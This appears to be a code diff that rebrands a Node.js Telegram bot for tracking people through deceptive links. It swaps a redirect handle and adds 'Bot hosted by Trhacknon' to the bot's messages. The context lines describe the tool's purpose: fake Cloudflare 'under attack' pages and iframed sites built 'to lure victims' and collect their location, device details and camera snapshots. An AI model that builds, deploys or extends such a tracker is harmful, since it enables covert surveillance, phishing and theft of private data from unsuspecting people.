@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
-res.redirect("https://t.me/toxinum");
+res.redirect("https://t.me/trhacknon");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
 } 
 else{
-res.redirect("https://t.me/toxinum");
+res.redirect("https://t.me/trhacknon");
 }
 
          
@@ -70,7 +70,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nBot hosted by Trhacknon\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -79,7 +79,7 @@ else if(msg.text=="/help"){
 bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
+Bot Hosted By Trhacknon\n\nSpecifications.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
